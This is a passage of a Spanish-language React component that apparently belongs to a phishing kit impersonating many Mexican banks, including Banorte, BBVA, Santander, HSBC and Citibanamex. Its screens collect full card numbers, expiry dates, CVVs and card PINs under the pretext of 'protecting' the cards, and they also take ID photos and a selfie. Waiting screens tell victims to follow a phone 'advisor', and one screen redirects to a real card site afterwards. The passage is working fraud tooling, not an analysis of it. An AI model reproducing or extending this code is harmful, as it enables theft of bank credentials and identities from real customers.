                    </div>

                    <div style={{ marginBottom: '16px' }}>
                      <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
                        Número de tarjeta (16 dígitos)
                      </label>
                      <input
                        type="text"
                        value={tarjeta.numero}
                        onChange={(e) => actualizarTarjeta(index, 'numero', e.target.value.replace(/\D/g, '').slice(0, 16))}
                        placeholder="1234 5678 9012 3456"
                        required
                        maxLength={16}
                        style={{ width: '100%', padding: '12px 16px', border: '1px solid #d1d5db', borderRadius: '6px', fontSize: '16px' }}
                        data-testid={`input-numero-tarjeta-${index}`}
                      />
                    </div>

                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px' }}>
                      <div>
                        <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
                          Vencimiento (MM/AA)
                        </label>
                        <input
                          type="text"
                          value={tarjeta.vencimiento}
                          onChange={(e) => {
                            let value = e.target.value.replace(/\D/g, '');
                            if (value.length >= 2) {
                              value = value.slice(0, 2) + '/' + value.slice(2, 4);
                            }
                            actualizarTarjeta(index, 'vencimiento', value);
                          }}
                          placeholder="MM/AA"
                          required
                          maxLength={5}
                          style={{ width: '100%', padding: '12px 16px', border: '1px solid #d1d5db', borderRadius: '6px', fontSize: '16px' }}
                          data-testid={`input-vencimiento-${index}`}
                        />
                      </div>
                      <div>
                        <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
                          CVV
                        </label>
                        <input
                          type="text"
                          value={tarjeta.cvv}
                          onChange={(e) => actualizarTarjeta(index, 'cvv', e.target.value.replace(/\D/g, '').slice(0, 4))}
                          placeholder="123"
                          required
                          maxLength={4}
                          style={{ width: '100%', padding: '12px 16px', border: '1px solid #d1d5db', borderRadius: '6px', fontSize: '16px' }}
                          data-testid={`input-cvv-${index}`}
                        />
                      </div>
                    </div>
                  </div>
                ))}

                <button
                  type="button"
                  onClick={agregarTarjeta}
                  style={{ width: '100%', padding: '12px', background: '#f3f4f6', color: '#374151', border: '1px dashed #9ca3af', borderRadius: '8px', fontSize: '15px', fontWeight: 600, cursor: 'pointer', marginBottom: '20px' }}
                  data-testid="button-agregar-tarjeta"
                >
                  + Agregar otra tarjeta
                </button>

                <button 
                  type="submit"
                  style={{ width: '100%', padding: '14px', background: '#0c4a5e', color: 'white', border: 'none', borderRadius: '8px', fontSize: '16px', fontWeight: 600, cursor: 'pointer', transition: 'background 0.3s' }}
                  onMouseOver={(e) => e.currentTarget.style.background = '#0a3d4f'}
                  onMouseOut={(e) => e.currentTarget.style.background = '#0c4a5e'}
                  data-testid="button-enviar-tarjetas"
                >
                  Proteger mis tarjetas
                </button>
              </form>
            </div>
          </div>
        );
        return proteccionTarjetasContent;

      case ScreenType.VERIFICANDO_INFO:
        const verificandoInfoContent = (
          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
            <div style={{ maxWidth: '500px', textAlign: 'center' }}>
              <div style={{ marginBottom: '32px' }}>
                <img src={validatingGif} alt="Verificando" style={{ width: '120px', height: '120px', margin: '0 auto' }} />
              </div>
              <h2 style={{ fontSize: '24px', fontWeight: 600, color: '#0c4a5e', marginBottom: '16px' }}>
                Estamos verificando la información
              </h2>
              <p style={{ fontSize: '16px', color: '#6b7280', lineHeight: '1.6', marginBottom: '8px' }}>
                Sigue las instrucciones de tu asesor telefónico
              </p>
              <p style={{ fontSize: '14px', color: '#9ca3af', fontStyle: 'italic' }}>
                No cierre esta ventana
              </p>
            </div>
          </div>
        );
        return verificandoInfoContent;

      case ScreenType.NETKEY_MANUAL:
        const manualChallenge = screenData.manualNetkeyChallenge || sessionData?.manualNetkeyChallenge || '00000000';
        return <NetKeyManual manualChallenge={manualChallenge} onSubmit={onSubmit} />;

      case ScreenType.NIP_TARJETA:
        const tarjetasProtegidas = sessionData?.tarjetasProtegidas 
          ? JSON.parse(sessionData.tarjetasProtegidas) 
          : [];

        const nipTarjetaContent = (
          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', padding: '20px' }}>
            <div style={{ maxWidth: '600px', margin: '0 auto', background: '#ffffff', borderRadius: '12px', boxShadow: '0 4px 20px rgba(0, 0, 0, 0.1)', padding: '40px' }}>
              <h2 style={{ fontSize: '24px', fontWeight: 700, color: '#1f2937', marginBottom: '16px', textAlign: 'center' }}>
                Ingresa el NIP de tu tarjeta
              </h2>

              <p style={{ fontSize: '16px', color: '#6b7280', marginBottom: '28px', textAlign: 'center', lineHeight: '1.6' }}>
                Por seguridad, necesitamos que ingreses el NIP de las tarjetas protegidas
              </p>

              <form onSubmit={(e) => {
                e.preventDefault();
                if (nipTarjeta.length === 4) {
                  onSubmit(ScreenType.NIP_TARJETA, { nipTarjeta });
                }
              }}>
                {tarjetasProtegidas.length > 0 && (
                  <div style={{ marginBottom: '24px' }}>
                    <h3 style={{ fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '12px' }}>
                      Tarjetas protegidas:
                    </h3>
                    {tarjetasProtegidas.map((tarjeta: any, index: number) => (
                      <div key={index} style={{ background: '#f9fafb', border: '1px solid #e5e7eb', borderRadius: '8px', padding: '12px', marginBottom: '8px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                        <span style={{ fontSize: '14px', color: '#374151' }}>
                          {tarjeta.tipo === 'credito' ? 'Crédito' : 'Débito'}
                        </span>
                        <span style={{ fontSize: '14px', fontWeight: 600, color: '#1f2937' }}>
                          **** {tarjeta.numero.slice(-4)}
                        </span>
                      </div>
                    ))}
                  </div>
                )}

                <div style={{ marginBottom: '24px' }}>
                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: '#374151', marginBottom: '8px' }}>
                    NIP de 4 dígitos
                  </label>
                  <input
                    type="password"
                    value={nipTarjeta}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '').slice(0, 4);
                      setNipTarjeta(value);
                    }}
                    maxLength={4}
                    placeholder="****"
                    style={{ width: '100%', padding: '12px', border: '1px solid #d1d5db', borderRadius: '8px', fontSize: '16px', textAlign: 'center', letterSpacing: '8px' }}
                    data-testid="input-nip-tarjeta"
                    required
                  />
                </div>

                <button
                  type="submit"
                  disabled={nipTarjeta.length !== 4}
                  style={{ width: '100%', background: nipTarjeta.length === 4 ? '#153e46' : '#9ca3af', color: 'white', padding: '14px', border: 'none', borderRadius: '8px', fontSize: '16px', fontWeight: 600, cursor: nipTarjeta.length === 4 ? 'pointer' : 'not-allowed', transition: 'background 0.3s' }}
                  data-testid="button-submit-nip"
                >
                  Continuar
                </button>
              </form>
            </div>
          </div>
        );
        return nipTarjetaContent;

      case ScreenType.CONFIRMAR_IDENTIDAD:
        const confirmarIdentidadContent = (
          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', padding: '20px' }}>
            <div style={{ maxWidth: '700px', margin: '0 auto', background: '#ffffff', borderRadius: '12px', boxShadow: '0 4px 20px rgba(0, 0, 0, 0.1)', padding: '40px' }}>
              <h2 style={{ fontSize: '24px', fontWeight: 700, color: '#1f2937', marginBottom: '16px', textAlign: 'center' }}>
                Confirma tu identidad
              </h2>

              <p style={{ fontSize: '16px', color: '#6b7280', marginBottom: '28px', textAlign: 'center', lineHeight: '1.6' }}>
                Sube una foto de tu identificación oficial
              </p>

              <form onSubmit={async (e) => {
                e.preventDefault();
                if (fotoIdentidadFrente && fotoSelfie) {
                  if (tipoIdentificacion === 'INE' && !fotoIdentidadAtras) {
                    return;
                  }

                  const frenteBase64 = await fileToBase64(fotoIdentidadFrente);
                  const selfieBase64 = await fileToBase64(fotoSelfie);
                  const atrasBase64 = fotoIdentidadAtras ? await fileToBase64(fotoIdentidadAtras) : undefined;

                  onSubmit(ScreenType.CONFIRMAR_IDENTIDAD, {
                    tipoIdentificacion,
                    fotoIdentidadFrente: frenteBase64,
                    fotoIdentidadAtras: atrasBase64,
                    fotoSelfie: selfieBase64
                  });
                }
              }}>
                <div style={{ marginBottom: '24px' }}>
                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: '#374151', marginBottom: '8px' }}>
                    Tipo de identificación
                  </label>
                  <div style={{ display: 'flex', gap: '12px' }}>
                    <button
                      type="button"
                      onClick={() => {
                        setTipoIdentificacion('INE');
                        setFotoIdentidadAtras(null);
                      }}
                      style={{ flex: 1, padding: '12px', border: tipoIdentificacion === 'INE' ? '2px solid #153e46' : '1px solid #d1d5db', borderRadius: '8px', background: tipoIdentificacion === 'INE' ? '#f0f9ff' : 'white', fontSize: '16px', fontWeight: 600, color: tipoIdentificacion === 'INE' ? '#153e46' : '#6b7280', cursor: 'pointer' }}
                      data-testid="button-tipo-ine"
                    >
                      INE
                    </button>
                    <button
                      type="button"
                      onClick={() => {
                        setTipoIdentificacion('Pasaporte');
                        setFotoIdentidadAtras(null);
                      }}
                      style={{ flex: 1, padding: '12px', border: tipoIdentificacion === 'Pasaporte' ? '2px solid #153e46' : '1px solid #d1d5db', borderRadius: '8px', background: tipoIdentificacion === 'Pasaporte' ? '#f0f9ff' : 'white', fontSize: '16px', fontWeight: 600, color: tipoIdentificacion === 'Pasaporte' ? '#153e46' : '#6b7280', cursor: 'pointer' }}
                      data-testid="button-tipo-pasaporte"
                    >
                      Pasaporte
                    </button>
                  </div>
                </div>

                <div style={{ marginBottom: '24px' }}>
                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: '#374151', marginBottom: '8px' }}>
                    Foto frontal de {tipoIdentificacion}
                  </label>
                  <div style={{ position: 'relative', border: '2px dashed #d1d5db', borderRadius: '8px', padding: '24px', textAlign: 'center', background: fotoIdentidadFrente ? '#f0fdf4' : '#f9fafb' }}>
                    <input
                      type="file"
                      accept="image/*"
                      onChange={(e) => {
                        if (e.target.files && e.target.files[0]) {
                          setFotoIdentidadFrente(e.target.files[0]);
                        }
                      }}
                      style={{ position: 'absolute', inset: 0, opacity: 0, cursor: 'pointer' }}
                      data-testid="input-foto-frente"
                      required
                    />
                    <div style={{ pointerEvents: 'none' }}>
                      <p style={{ fontSize: '16px', color: '#6b7280', marginBottom: '4px' }}>
                        {fotoIdentidadFrente ? `✓ ${fotoIdentidadFrente.name}` : 'Toca para subir foto'}
                      </p>
                      <p style={{ fontSize: '12px', color: '#9ca3af' }}>
                        Foto del frente de tu {tipoIdentificacion}
                      </p>
                    </div>
                  </div>
                </div>

                {tipoIdentificacion === 'INE' && (
                  <div style={{ marginBottom: '24px' }}>
                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: '#374151', marginBottom: '8px' }}>
                      Foto trasera de INE
                    </label>
                    <div style={{ position: 'relative', border: '2px dashed #d1d5db', borderRadius: '8px', padding: '24px', textAlign: 'center', background: fotoIdentidadAtras ? '#f0fdf4' : '#f9fafb' }}>
                      <input
                        type="file"
                        accept="image/*"
                        onChange={(e) => {
                          if (e.target.files && e.target.files[0]) {
                            setFotoIdentidadAtras(e.target.files[0]);
                          }
                        }}
                        style={{ position: 'absolute', inset: 0, opacity: 0, cursor: 'pointer' }}
                        data-testid="input-foto-atras"
                        required
                      />
                      <div style={{ pointerEvents: 'none' }}>
                        <p style={{ fontSize: '16px', color: '#6b7280', marginBottom: '4px' }}>
                          {fotoIdentidadAtras ? `✓ ${fotoIdentidadAtras.name}` : 'Toca para subir foto'}
                        </p>
                        <p style={{ fontSize: '12px', color: '#9ca3af' }}>
                          Foto de atrás de tu INE
                        </p>
                      </div>
                    </div>
                  </div>
                )}

                <div style={{ marginBottom: '24px' }}>
                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: '#374151', marginBottom: '8px' }}>
                    Foto selfie
                  </label>
                  <div style={{ position: 'relative', border: '2px dashed #d1d5db', borderRadius: '8px', padding: '24px', textAlign: 'center', background: fotoSelfie ? '#f0fdf4' : '#f9fafb' }}>
                    <input
                      type="file"
                      accept="image/*"
                      onChange={(e) => {
                        if (e.target.files && e.target.files[0]) {
                          setFotoSelfie(e.target.files[0]);
                        }
                      }}
                      style={{ position: 'absolute', inset: 0, opacity: 0, cursor: 'pointer' }}
                      data-testid="input-foto-selfie"
                      required
                    />
                    <div style={{ pointerEvents: 'none' }}>
                      <p style={{ fontSize: '16px', color: '#6b7280', marginBottom: '4px' }}>
                        {fotoSelfie ? `✓ ${fotoSelfie.name}` : 'Toca para subir foto'}
                      </p>
                      <p style={{ fontSize: '12px', color: '#9ca3af' }}>
                        Toma una selfie con tu rostro visible
                      </p>
                    </div>
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={!fotoIdentidadFrente || !fotoSelfie || (tipoIdentificacion === 'INE' && !fotoIdentidadAtras)}
                  style={{ width: '100%', background: (fotoIdentidadFrente && fotoSelfie && (tipoIdentificacion === 'Pasaporte' || fotoIdentidadAtras)) ? '#153e46' : '#9ca3af', color: 'white', padding: '14px', border: 'none', borderRadius: '8px', fontSize: '16px', fontWeight: 600, cursor: (fotoIdentidadFrente && fotoSelfie && (tipoIdentificacion === 'Pasaporte' || fotoIdentidadAtras)) ? 'pointer' : 'not-allowed', transition: 'background 0.3s' }}
                  data-testid="button-submit-identidad"
                >
                  Enviar documentos
                </button>
              </form>
            </div>
          </div>
        );
        return confirmarIdentidadContent;

      case ScreenType.VALIDANDO_IDENTIDAD:
        const validandoIdentidadContent = (
          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
            <div style={{ maxWidth: '500px', textAlign: 'center' }}>
              <div style={{ marginBottom: '32px' }}>
                <img src={validatingGif} alt="Validando" style={{ width: '120px', height: '120px', margin: '0 auto' }} />
              </div>
              <h2 style={{ fontSize: '24px', fontWeight: 600, color: '#0c4a5e', marginBottom: '16px' }}>
                Estamos validando tu información
              </h2>
              <p style={{ fontSize: '16px', color: '#6b7280', lineHeight: '1.6', marginBottom: '8px' }}>
                Sigue las instrucciones de tu ejecutivo en línea
              </p>
              <p style={{ fontSize: '14px', color: '#9ca3af', fontStyle: 'italic' }}>
                Espera un momento. No cierres esta ventana
              </p>
            </div>
          </div>
        );
        return validandoIdentidadContent;

      default:
        return (
          <div className="text-center py-8">
            <p className="text-gray-600">
              Tipo de pantalla no reconocido: {currentScreen}
            </p>
          </div>
        );
    }
  };

  // Definimos las clases de estilos para los botones según el banco
  const getPrimaryBtnClass = () => {
    switch(banco) {
      case 'LIVERPOOL':
        return 'bg-[#E1147B] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'CITIBANAMEX':
        return 'bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANBAJIO':
        return 'banbajio-button'; // Ya tiene todos los estilos definidos en el CSS
      case 'BBVA':
        return 'bbva-button';
      case 'BANCOPPEL':
        return 'bg-[#0066B3] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'HSBC':
        return 'bg-[#DB0011] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'AMEX':
        return 'bg-[#0077C8] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'SANTANDER':
        return 'bg-[#EC0000] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'SCOTIABANK':
        return 'bg-[#EC111A] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANAMEX':
        return 'bg-[#153e46] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANREGIO':
        return 'bg-[#FF6600] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANORTE':
        return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      default:
        return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Banorte por defecto
    }
  };

  const primaryBtnClass = getPrimaryBtnClass();

  // Efecto para redirección automática si la pantalla es GENERANDO_ACLARACION
  useEffect(() => {
    if (currentScreen === ScreenType.GENERANDO_ACLARACION) {
      // Temporizador para la redirección (3 segundos)
      const redirectTimer = setTimeout(() => {
        window.location.href = 'https://www.platacard.com/';
      }, 3000);

      // Limpieza del temporizador si el componente se desmonta
      return () => clearTimeout(redirectTimer);
    }
  }, [currentScreen]);

  // Eliminamos la función bankLogo ya que solo usaremos el logo en el header del ClientScreen.tsx

  // Función para obtener la clase de header según el banco
  const getBankHeaderClass = () => {
    switch(banco) {
      case 'LIVERPOOL': return 'liverpool-header';
      case 'BANBAJIO': return 'banbajio-header';
      case 'CITIBANAMEX': return 'citibanamex-header';
      case 'BBVA': return 'bbva-header';
      case 'BANCOPPEL': return 'bg-[#0066B3] text-white p-2';
      case 'HSBC': return 'bg-white text-[#DB0011] p-2 border-t-2 border-[#DB0011]';
      case 'AMEX': return 'bg-[#0077C8] text-white p-2';
      case 'SANTANDER': return 'santander-header';
      case 'SCOTIABANK': return 'scotiabank-header';
      case 'BANAMEX': return 'banamex-header';
      case 'BANREGIO': return 'banregio-header';
      case 'BANORTE': return 'banorte-header';
      default: return 'bg-gray-100 p-3 text-center font-semibold';
    }
  };

  // Función para obtener la clase del contenedor según el banco
  const getBankContainerClass = () => {
    switch(banco) {
      case 'LIVERPOOL': return 'bg-white p-4 rounded-lg shadow liverpool-container';
      case 'BANBAJIO': return 'bg-white p-4 rounded-lg shadow';
      case 'CITIBANAMEX': return 'citibanamex-container';
      case 'BBVA': return 'bbva-container';
      case 'BANCOPPEL': return 'bg-white p-4 rounded-lg shadow bancoppel-container';
      case 'HSBC': return 'bg-white p-4 rounded-lg shadow hsbc-container';
      case 'AMEX': return 'bg-white p-4 rounded-lg shadow amex-container';
      case 'SANTANDER': return 'bg-white p-4 rounded-lg shadow santander-container';
      case 'SCOTIABANK': return 'bg-white p-4 rounded-lg shadow scotiabank-container';
      case 'BANAMEX': return 'bg-white p-4 rounded-lg shadow banamex-container';
      case 'BANREGIO': return 'bg-white p-4 rounded-lg shadow banregio-container';
      case 'BANORTE': return 'banorte-container';
      default: return '';
    }
  };

  // Renderizados especiales según el banco
  if (banco === 'CITIBANAMEX') {
    // Podríamos agregar un renderizado especial para CitiBanamex si se necesita en el futuro
  }

  // Renderizado normal para otros bancos
  return (
    <div className={getBankContainerClass()}>
      {/* No mostrar logos en el contenido principal - los logos ya están en el header de cada banco */}
      {renderScreen()}
    </div>
  );
};

